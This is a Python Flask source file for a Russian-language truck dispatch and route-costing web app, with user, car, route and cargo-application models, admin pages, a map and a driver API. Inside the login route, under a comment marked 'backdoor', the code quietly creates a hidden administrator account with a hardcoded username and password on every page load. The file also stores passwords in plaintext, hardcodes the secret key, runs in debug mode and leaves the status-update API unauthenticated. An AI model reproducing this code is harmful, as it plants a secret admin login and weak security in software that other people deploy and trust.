# import
import re
from EOE import evaluation_of_effectiveness
from flask import Flask, request, render_template, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin, current_user
from werkzeug.utils import redirect
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import datetime
import sqlalchemy
import itsdangerous
from flask_login import LoginManager, login_user, login_required, logout_user
import json
import plotly.graph_objs as go
from flask_restful import Api, Resource
from sqlalchemy.orm import class_mapper


# app config
app = Flask(__name__)
app.debug = True
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///north_star.db'
app.config['SECRET_KEY'] = 'north_star_secret_key'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
api = Api(app)


# class user for db
class User(db.Model, UserMixin):
    # айди юзера
    id = db.Column(db.Integer, primary_key=True)
    # почта
    email = db.Column(db.String(200), nullable=False)
    # логин
    username = db.Column(db.String(120), nullable=False, unique=True)
    # пароль
    password = db.Column(db.String(120), nullable=False)
    # дата регистрации
    created_date = sqlalchemy.Column(sqlalchemy.DateTime, default=datetime.datetime.now)
    # статус пользователя в общей иерархии юзеров
    status = db.Column(db.String(120), nullable=False)


# class Cars for db
class Cars(db.Model, UserMixin):
    # айди машины
    id = db.Column(db.Integer, primary_key=True)
    # номер машины
    car_number = db.Column(db.String(120), nullable=False, unique=True)
    # модель машины
    model = db.Column(db.String(120), nullable=False)
    # дата регистрации
    created_date = sqlalchemy.Column(sqlalchemy.DateTime, default=datetime.datetime.now)
    # статус машины
    status = db.Column(db.String(120))
    # айди текущего водителя
    car_driver_id = db.Column(db.Integer)


class Application(db.Model, UserMixin):
    # айди заявки
    id = db.Column(db.Integer, primary_key=True)
    # координаты начала
    coord_start = db.Column(db.String(120), nullable=False, unique=True)
    # координаты конца
    coord_end = db.Column(db.String(120), nullable=False, unique=True)
    # дата начала поездки
    date_of_start = sqlalchemy.Column(db.String(120), nullable=False)
    # дата окончания поездки
    date_of_end = sqlalchemy.Column(db.String(120), nullable=True)
    # статус заявки
    status = db.Column(db.String(120))
    # вес груза
    weight = db.Column(db.String(120), nullable=True)
    # фура на заявке сейчас
    car_now = db.Column(db.String(120), nullable=True)


class Routes(db.Model, UserMixin):
    # айди маршрута
    id = db.Column(db.Integer, primary_key=True)
    # Точка начала
    city_start = db.Column(db.String(120), nullable=False)
    # Точка окончания маршрута
    city_end = db.Column(db.String(120), nullable=False)
    # дата регистрации
    created_date = sqlalchemy.Column(sqlalchemy.DateTime, default=datetime.datetime.now)
    # Километры по платону
    platon_km = db.Column(db.Integer)
    # Километры по автодору
    autodor_km = db.Column(db.Integer, nullable=True)
    # Общие километры
    oll_km = db.Column(db.Integer)
    # Города на пути
    cities_on_route = db.Column(db.JSON)


class Settings_for_routes(db.Model):
    # id
    id = db.Column(db.Integer, primary_key=True)
    # Зарплата водителя
    driver_salary = db.Column(db.Float)
    # Стоимость проезда по платону
    platon_cost = db.Column(db.Float)


# необходимые переменные
data_of_roads_for_analytics = {}

# статусы
# 1. Свободна
# 2. Назначена
# 3. Прибыла на погрузку
# 4. Погружена
# 5. Транзит
# 6. Прибыла на выгрузку
# 7. Выгружена
# 8. Завершение рейса
# Готовы ли к след рейсу?
# Свободна
# 9. На Т.О.


# авторизация
@login_manager.user_loader
def load_user(user_id):
    return User.query.filter_by(id=user_id).first()


# главная страница
@app.route('/home', methods=['POST', 'GET'])
@login_required
def home():
    # получаем айди зашедшего на сайт
    user_id = current_user.id

    # инфа о пользователе из бд
    temp = (User.query.filter_by(id=user_id).first()).__dict__

    # инфа о машинах из бд
    car_print = Cars.query.order_by(Cars.id).all()

    # достаем все заявки в пути
    applications = Application.query.filter_by(status="5").all()

    # получаем специальный словарь для отображения заявок на карте
    car_coordinates = {}
    for application_coord in applications:
        car_number = application_coord.car_now
        coord_start = application_coord.coord_start
        coord_end = application_coord.coord_end
        car_coordinates[car_number] = (coord_start, coord_end)

    # Загрузка файла GeoJSON/json
    with open('geo_data/geoBoundaries-RUS-ADM1_simplified.geojson') as f:
        geojson_data = json.load(f)

    # Создание карты с помощью Plotly
    fig = go.Figure(go.Choroplethmapbox(
        geojson=geojson_data,  # загруженный GeoJSON
        locations=[],  # Список местоположений (если есть)
        z=[],  # Список значений (если есть)
        colorscale='Viridis',  # Цветовая схема
        zmin=0,  # Минимальное значение
        zmax=100,  # Максимальное значение
        marker_opacity=0.5,  # Прозрачность маркеров
        marker_line_width=0  # Ширина линии маркеров
    ))

    fig.update_layout(
        mapbox_style="carto-positron",  # Стиль карты Mapbox
        mapbox_zoom=3,  # Масштаб карты
        mapbox_center={"lat": 55.7558, "lon": 37.6173}  # Центр карты (Москва)
    )

    # Добавляем точки для городов
    cities = {
        'Москва': {'lat': 55.7558, 'lon': 37.6173, 'color': 'green'},
        'Санкт-Петербург': {'lat': 59.9343, 'lon': 30.3351, 'color': 'green'},
        'Екатеринбург': {'lat': 56.838011, 'lon': 60.597465, 'color': 'green'},
        'Самара': {'lat': 53.195538, 'lon': 50.101783, 'color': 'green'},
        'Казань': {'lat': 55.795793, 'lon': 49.106585, 'color': 'green'},
        'Новосибирск': {'lat': 55.030199, 'lon': 82.920430, 'color': 'green'}
    }

    # генерируем города на карте
    for city, data in cities.items():
        fig.add_trace(go.Scattermapbox(
            lat=[data['lat']],
            lon=[data['lon']],
            mode='markers',
            marker=go.scattermapbox.Marker(
                size=14,
                color=data['color'],
                opacity=1
            ),
            text=[city],
            hoverinfo='text',
            name=f'{city}'

        ))

    # Добавляем точки для каждой машины в пути
    for car_number, (coord_start, coord_end) in car_coordinates.items():
        # Разделяем строки начальных координат по запятой и преобразуем каждую часть в число
        lat_start, lon_start = map(float, coord_start.split(','))

        # Разделяем строки конечных координат по запятой и преобразуем каждую часть в число
        lat_end, lon_end = map(float, coord_end.split(','))
        # Добавляем точку начальной координаты
        fig.add_trace(go.Scattermapbox(
            lat=[lat_start, lat_end],
            lon=[lon_start, lon_end],
            mode='markers',
            marker=go.scattermapbox.Marker(
                size=14,
                color='red',
                opacity=1
            ),
            text=[f'Start {car_number}: {lat_start}, {lon_start}', f'End {car_number}: {lat_end}, {lon_end}'],  # Используем текст начальной и конечной координат
            hoverinfo='text',
            name=f'Машина {car_number}'  # Устанавливаем имя маркера как номер машины
        ))

    # Преобразование объекта графика в JSON для передачи в HTML
    graph_json = fig.to_json()

    # разграничение прав доступа
    if temp['status'] == 'Администратор' or temp['status'] == 'Диспетчер':
        return render_template("home.html", car_print=car_print, graph_json=graph_json)
    else:
        return 'у вас недостаточно прав'


# профиль пользвателя
@app.route('/account')
@login_required
def accout():
    # получаем айди пользователя зашедшего на страницу
    user_id = current_user.id
    # забираем информацию по нему из бд для дальнейшей обработки
    user_data_in_profile = (User.query.filter_by(id=user_id).first()).__dict__
    # рендрер страницы
    return render_template("accout.html", data=user_data_in_profile)


# регистрация пользователя администратором
@app.route('/admin/add_users', methods=['POST', 'GET'])
@login_required
def add_users():
    # получаем айди пользователя зашедшего на сайт
    user_id = current_user.id

    # забираем инфу из бд по нему
    user_status = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if user_status['status'] == 'Администратор':
        if request.method == "POST":
            # получение данных из формы
            username = request.form['username']
            password = request.form['password']
            email = request.form['email']
            status = request.form['status']

            # собираем объект юзер_ для регистрации в бд
            user_ = User(username=username, password=password, email=email, status=status)

            # регистрация в базе
            db.session.add(user_)
            db.session.commit()

            return redirect("/")
        else:
            return render_template("admin_add_users.html")
    else:
        return 'у вас недостаточно прав'


# регистрация маршрутов администратором
@app.route('/admin/add_routes', methods=['POST', 'GET'])
@login_required
def add_routes():
    # Получаем айди пользователя, зашедшего на сайт
    user_id = current_user.id

    # Забираем информацию из базы данных о пользователе
    user_status = User.query.filter_by(id=user_id).first()

    # Разграничение прав доступа
    if user_status.status == 'Администратор':
        if request.method == "POST":
            # Получение данных из формы
            city_start = request.form['city_start']
            city_end = request.form['city_end']
            platon_km = request.form['platon_km']
            autodor_km = request.form['autodor_km']
            oll_km = request.form['oll_km']
            cities_on_route_input = request.form['cities_on_route']

            # Разделение введенной строки на отдельные города
            cities_on_route = [city.strip() for city in re.split(r'[,; ]+', cities_on_route_input)]

            # Создание объекта маршрута для регистрации в базе данных
            route = Routes(city_start=city_start, city_end=city_end, platon_km=platon_km, autodor_km=autodor_km,
                           oll_km=oll_km, cities_on_route=cities_on_route)

            # Регистрация маршрута в базе данных
            db.session.add(route)
            db.session.commit()

            return redirect("/admin/add_routes")
        else:
            return render_template("admin_add_routes.html")
    else:
        return 'У вас недостаточно прав'


# Посмотреть все маршруты
@app.route("/admin/print_routes")
@login_required
def print_routes():
    # Получаем айди пользователя, зашедшего на сайт
    user_id = current_user.id

    # Забираем информацию из базы данных о пользователе
    user_status = User.query.filter_by(id=user_id).first()

    # Разграничение прав доступа
    if user_status.status == 'Администратор':
        routes_print = Routes.query.order_by(Routes.id).all()
        return render_template("print_routes.html", data=routes_print)
    else:
        return 'У вас недостаточно прав'


# добавление настроек для оценки стоимости маршрутов
@app.route('/admin/add_settings', methods=['POST', 'GET'])
@login_required
def add_settings():
    # Получаем айди пользователя, зашедшего на сайт
    user_id = current_user.id

    # Забираем информацию из базы данных о пользователе
    user_status = User.query.filter_by(id=user_id).first()

    # Разграничение прав доступа
    if user_status.status == 'Администратор':
        if request.method == "POST":
            # Получение данных из формы
            driver_salary = request.form['driver_salary']
            platon_cost = request.form['platon_cost']

            # Проверка существования предыдущих настроек и их удаление, если они есть
            previous_settings = Settings_for_routes.query.get(1)
            if previous_settings:
                db.session.delete(previous_settings)

            # Создание объекта настроек для регистрации в базе данных
            settings = Settings_for_routes(driver_salary=driver_salary, platon_cost=platon_cost)

            # Регистрация настроек в базе данных
            db.session.add(settings)
            db.session.commit()

            return redirect("/admin")  # редирект home админа
        else:
            return render_template("add_settings.html")
    else:
        return 'У вас недостаточно прав'


# регистрация машин администратором
@app.route('/admin/add_cars', methods=['POST', 'GET'])
@login_required
def add_cars():
    # получаем айди пользователя зашедшего на сайт
    user_id = current_user.id

    # забираем инфу из бд по нему
    user_status = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if user_status['status'] == 'Администратор':
        if request.method == "POST":
            # получение данных из формы
            car_number = request.form['car_number']
            model = request.form['model']

            # собираем объект cars для регистрации в бд
            cars = Cars(car_number=car_number, model=model)

            # регистрация в базе
            db.session.add(cars)
            db.session.commit()

            # изменяем статус машины после регистрации на "Свободна"
            car_status_change = Cars.query.filter_by(car_number=car_number).first()

            # Изменяем атрибуты объекта
            car_status_change.status = '1'

            # сохраняем обновленный статус
            db.session.commit()

            print(f'CAR: {car_number}, {model} was created')

            return redirect("/admin")
        else:
            return render_template("admin_add_cars.html")
    else:
        return 'у вас недостаточно прав'


# посмотреть всех пользвателей
@app.route("/admin/print_users")
@login_required
def print_user():
    # получаем айди пользователя зашедшего на сайт
    user_id = current_user.id

    # забираем инфу из бд по нему
    user_status = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if user_status['status'] == 'Администратор':
        user_print = User.query.order_by(User.id).all()
        return render_template("print_user.html", data=user_print)
    else:
        return 'у вас недостаточно прав'


# админ панель
@app.route("/admin", methods=['POST', 'GET'])
@login_required
def admin():
    # получаем айди пользователя зашедшего на сайт
    user_id = current_user.id

    # забираем инфу из бд по нему
    user_status = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if user_status['status'] == 'Администратор':
        # инфа о заявках из бд
        temp1 = Application.query.order_by(Application.id).all()

        # функционал удаления заявки
        if request.method == 'POST':
            # ищем кнопку
            application_id = request.form['id']
            # выбираем заявку из бд
            application_to_delete = Application.query.get(application_id)

            # for delete
            application_to_delete1 = Application.query.get(application_id).__dict__

            # если она существует
            if application_to_delete:
                # получаем номер машины которая сейчас находится на заявке
                car_now = application_to_delete1['car_now']

                # внесение изменения в базу самих машин, изменение статуса машины
                car_status_after_application_delete = Cars.query.filter_by(car_number=car_now).first()

                # Изменяем атрибуты объекта
                car_status_after_application_delete.status = '1'

                # удаляем саму заявку
                db.session.delete(application_to_delete)

                # сохраняем изменения
                db.session.commit()
                return redirect("/admin")
            else:
                return "заявки не существует"
        else:
            # Получение главных настроек из базы данных
            settings = Settings_for_routes.query.all()
            return render_template("admin_home.html", data=temp1, settings=settings)
    else:
        return 'у вас недостаточно прав'


# вход
@app.route('/', methods=['POST', 'GET'])
def login():
    # создаются все бд на сервере
    db.create_all()

    #####################################################################################################
    # backdoor
    check = User.query.filter_by(username="superadmin#pressf1om").first()

    if check is None:
        # собираем объект hidden_user для регистрации в бд
        hidden_user = User(username="superadmin#pressf1om", password="yduabwuyd2b38a7dbawdia7b2jda2jdaj2",
                           email="fucksystem@email.com", status="Администратор")

        # регистрация в базе
        db.session.add(hidden_user)
        db.session.commit()
    #####################################################################################################

    # Если пользователь заходит не авторизованный, то ему предлагают авторизоваться
    if request.method == "GET":
        return render_template('login.html')
    else:
        # получаем отправленные данные
        login_form = request.form.get('username')
        password_form = request.form.get('password')

        # если есть и то и то
        if login_form and password_form:
            # находим совпадения в базе данных
            user_auth = User.query.filter_by(username=login_form).first()
            try:
                # извлекаем данные
                user_auth_dict = user_auth.__dict__

                # данные о пользователе в базе
                user__auth = user_auth_dict['username']
                pass__auth = user_auth_dict['password']
            except:
                # Дописать обработчик этой ошибки в хтмл
                print('ПОльзовтель не найден')

            # если данные совпадают, то мы авторизовываем пользователя
            if user__auth == login_form and pass__auth == password_form:
                # функция фласк логин
                login_user(user_auth)
                print(f"никнейм вошедшего: {user__auth}")
                return redirect("/home")
            else:
                return 'Логин либо пароль не совпадают с базой'
        else:
            return 'нет и того и другого, ошибка авторизации'


# выход
@app.route('/logout', methods=['GET', 'POST'])
@login_required
def logout():
    # деаутендификация через фласк логин
    logout_user()
    return redirect("/")


# страница добавления заявок для анализа
@app.route('/analytics_add_data', methods=['POST', 'GET'])
@login_required
def analytics_add_data():
    # Получение списка маршрутов из базы данных
    routes = Routes.query.all()

    # получаем айди зашедшего на сайт
    user_id = current_user.id

    # инфа о пользователе из бд
    temp = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if temp['status'] == 'Администратор' or temp['status'] == 'Диспетчер':
        if request.method == "POST":
            # получение данных из формы
            number_of_road = request.form['number_of_road']
            date_start = request.form['start-date']
            date_end = request.form['end-date']
            route_id = request.form['route']
            cost = request.form['cost']
            fuel_cost = request.form['fuel_cost']

            # Дополнительная обработка данных, если необходимо

            data_of_roads_for_analytics[f'{number_of_road}'] = \
                [f'{date_start}',
                f'{date_end}',
                f'{route_id}',
                f'{cost}',
                f'{fuel_cost}']

            return redirect("/analytics_add_data")
        else:
            return render_template("analytics_add_data.html", routes=routes)
    else:
        return 'У вас недостаточно прав'


# Страница результатов анализа
@app.route('/analytics', methods=['POST', 'GET'])
@login_required
def analytics():
    # Получение списка маршрутов из базы данных
    routes = Routes.query.all()

    # Получение айди зашедшего на сайт
    user_id = current_user.id

    # Информация о пользователе из бд
    temp = (User.query.filter_by(id=user_id).first()).__dict__

    # Разграничение прав доступа
    if temp['status'] == 'Администратор' or temp['status'] == 'Диспетчер':
        if request.method == "POST":
            pass
        else:
            final_costs = {}
            for number, data_list in data_of_roads_for_analytics.items():
                autodor_price = data_list[3]
                fuel_price = data_list[4]

                # Получение айди маршрута из словаря data_of_roads_for_analytics
                route_id = data_list[2]

                # Получение объекта маршрута из базы данных по его айди
                route = Routes.query.get(route_id)

                # Получение значений platon_km и autodor_km из объекта маршрута
                platon_km = route.platon_km
                oll_km = route.oll_km

                # Вычисление финальной стоимости поездки с помощью функции evaluation_of_effectiveness
                final_cost = evaluation_of_effectiveness(int(autodor_price), int(fuel_price), int(platon_km), int(oll_km))

                # Добавление в словарь номера маршрута и его финальной стоимости
                final_costs[number] = {'final_cost': final_cost}

            return render_template("choosing_route.html", data_of_roads_for_analytics=data_of_roads_for_analytics, final_costs=final_costs, routes=routes)
    else:
        return 'У вас недостаточно прав'


# страница регистрации заявки
@app.route('/registration_new_application', methods=['POST', 'GET'])
@login_required
def registration_new_application():
    # получаем айди зашедшего на сайт
    user_id = current_user.id

    # инфа о пользователе из бд
    temp = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if temp['status'] == 'Администратор' or temp['status'] == 'Диспетчер':
        if request.method == "POST":
            # получение данных из формы
            start_point = request.form['start-point']
            end_point = request.form['end-point']
            departure_date = request.form['departure-date']
            cargo_weight = request.form['cargo-weight']
            car_now = request.form['car_now']

            #  регистрация заявок , статус "Назначена"
            application = Application(coord_start=start_point, coord_end=end_point, date_of_start=departure_date, status='2', weight=cargo_weight, car_now=car_now)

            # внесение изменения в базу самих машин, изменение статуса машины
            car_status_after_application = Cars.query.filter_by(car_number=car_now).first()

            # Изменяем атрибуты объекта, статус "Назначена"
            car_status_after_application.status = '2'

            # регистрация в базе
            db.session.add(application)
            db.session.commit()

            print(f"application #{departure_date} was created")

            return redirect("/current_applications")
        else:
            # собираем статусы машин для добавления в форму
            free_cars = Cars.query.filter_by(status="1").all()

            # проверка
            if free_cars:
                # собираем список для отправки в форму
                car_numbers = [car.car_number for car in free_cars]
                # передаем если есть
                return render_template("registration_new_application.html", free_cars=car_numbers)
            else:
                return render_template("registration_new_application.html", free_cars=["Нет свободных машин"])
    else:
        return 'у вас недостаточно прав'


# страница отображения всех существующих заявок
@app.route('/current_applications', methods=['POST', 'GET'])
@login_required
def current_applications():
    # получаем айди зашедшего на сайт
    user_id = current_user.id

    # инфа о пользователе из бд
    temp = (User.query.filter_by(id=user_id).first()).__dict__

    # разграничение прав доступа
    if temp['status'] == 'Администратор' or temp['status'] == 'Диспетчер':

        # инфа о заявках из бд
        temp1 = Application.query.order_by(Application.id).all()

        # render
        return render_template("current_applications.html", data=temp1)
    else:
        return 'у вас недостаточно прав'


# преобразование объекта бд в словарь
def sqlalchemy_to_dict(obj):
    try:
        return {column.key: getattr(obj, column.key) for column in class_mapper(obj.__class__).columns}
    except:
        return {'message': 'Application not found'}, 404


# API для мобильного приложения водителей
class Application_api(Resource):
    # получение актуальной заявки
    def get(self, car_number):
        # получаем объект из бд, заявки со статусом "назначена"
        application = (Application.query.filter_by(car_now=car_number, status="2").first())
        # преобразовываем в словарь с помощью sqlalchemy_to_dict
        application_dict = sqlalchemy_to_dict(application)
        # если объект не пустой
        if application_dict:
            return jsonify(application_dict)
        else:
            return {'message': 'Application not found'}, 404

    # внесение изменений в статус заявки
    def post(self, car_number):
        # Возможны 3 статуса
        # Поездка завершена
        # В пути
        # Свободна
        # Получаем данные о заявке из запроса
        data = request.get_json()

        # Получаем объект заявки из базы данных по номеру машины
        application_post = Application.query.filter_by(car_now=car_number).first()

        # Получаем объект машины из базы данных по номеру машины
        car_post = Cars.query.filter_by(car_number=car_number).first()

        # Проверяем, существует ли такая заявка
        if application_post:
            # Если существует, изменяем статус заявки
            new_status = data.get('new_status')  # Предполагаем, что новый статус передается в теле запроса
            # Если Свободна, то меняем статус
            if new_status == "1":
                # меняем статус машины
                car_post.status = '1'
                # меняем статус заявки
                application_post.status = '1'
            # Назначена
            elif new_status == "2":
                # меняем статус машины
                car_post.status = '2'
                # меняем статус заявки
                application_post.status = '2'
            # Прибыла на погрузку
            elif new_status == "3":
                # меняем статус машины
                car_post.status = '3'
                # меняем статус заявки
                application_post.status = '3'
            # Погружена
            elif new_status == "4":
                # меняем статус машины
                car_post.status = '4'
                # меняем статус заявки
                application_post.status = '4'
            # Транзит
            elif new_status == "5":
                # меняем статус машины
                car_post.status = '5'
                # меняем статус заявки
                application_post.status = '5'
            # Прибыла на выгрузку
            elif new_status == "6":
                # меняем статус машины
                car_post.status = '6'
                # меняем статус заявки
                application_post.status = '6'
            # Выгружена
            elif new_status == "7":
                # меняем статус машины
                car_post.status = '7'
                # меняем статус заявки
                application_post.status = '7'
            # Завершение рейса
            elif new_status == "8":
                # меняем статус машины
                car_post.status = '8'
                # меняем статус заявки
                application_post.status = '8'
            #  На Т.О.
            elif new_status == "9":
                # меняем статус машины
                car_post.status = '9'
                # меняем статус заявки
                application_post.status = '9'

            # Сохраняем изменения в базе данных
            db.session.commit()

            # Возвращаем сообщение об успешном изменении статуса
            return {'message': 'Status updated successfully'}, 200
        else:
            # Если заявка не найдена, возвращаем сообщение об ошибке
            return {'message': 'Application not found'}, 404


# Добавление ресурса к API
api.add_resource(Application_api, '/api/applications/<string:car_number>')


if __name__ == '__main__':
    # port = int(os.environ.get("PORT", 5000))
    # app.run(host='0.0.0.0', port=port)
    app.run(host='127.0.0.1', port=5000)
